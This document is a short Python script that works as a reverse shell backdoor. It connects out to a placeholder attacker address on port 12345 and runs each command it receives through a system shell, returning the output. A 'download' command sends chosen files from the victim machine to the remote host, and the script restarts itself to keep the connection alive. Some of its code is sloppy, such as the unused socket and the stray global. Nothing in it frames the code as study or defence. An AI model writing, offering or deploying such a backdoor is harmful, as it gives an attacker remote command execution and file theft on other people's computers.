import socket
import subprocess
import socket
import sys
import tqdm
import os

SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096 

def send_file(adds):
    print("Downloading from this path: "+adds)
    filename = adds
    # get the file size
    filesize = os.path.getsize(filename)
    sock.send(f"{filename}{SEPARATOR}{filesize}".encode())
    # progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "rb") as f:
        while True:
            
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                break
            sock.sendall(bytes_read)
            # progress.update(len(bytes_read))
            print("File sent")
        sock.close()
        print("Disconnected... Trying to connect")
    os.system('python chat3.py')
        # simply_sock()

def simply_sock():
    print("Hello")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("IP_ADDRESS_ROUTER", 12345))


def shell(sock):
   
    while True:
        command = sock.recv(1024).decode()
        print(command)
        if command.strip() == 'q':
            break
        elif command[0:8] == "download":
            adds = command[9:]
            send_file(adds)
            os.execl(sys.executable, sys.executable, *sys.argv)
            # simply_sock()
        elif command[:2] == "cd" and len(command) >1:
            try:
                os.chdir(command[3:])
            except:
                continue
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            sock.send(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("IP_ADDRESS_Router", 12345))

simply_sock()
shell(sock)
sock.close()
